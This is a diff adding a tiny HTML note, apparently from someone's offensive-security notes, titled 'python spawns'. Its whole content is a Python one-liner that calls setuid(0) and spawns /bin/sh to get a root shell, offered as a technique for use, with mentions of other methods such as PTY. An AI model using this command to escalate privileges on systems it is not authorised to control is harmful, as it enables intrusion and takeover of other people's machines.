@@ -1,0 +1,10 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>python spawns</title>
+</head><body><span style="font-size: 18pt">There are a few different ways to do this<br/>
+OS, PTY, etc<br/>
+<br/>
+spawn shell with OS trying setuid(0) [for root]</span><ul><li style="list-style-type: none"><div style="text-align: left"><span style="font-size: 15pt"><span style="font-family: Roboto">python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'</span></span></div> </li>
+</ul>
+</body></html>
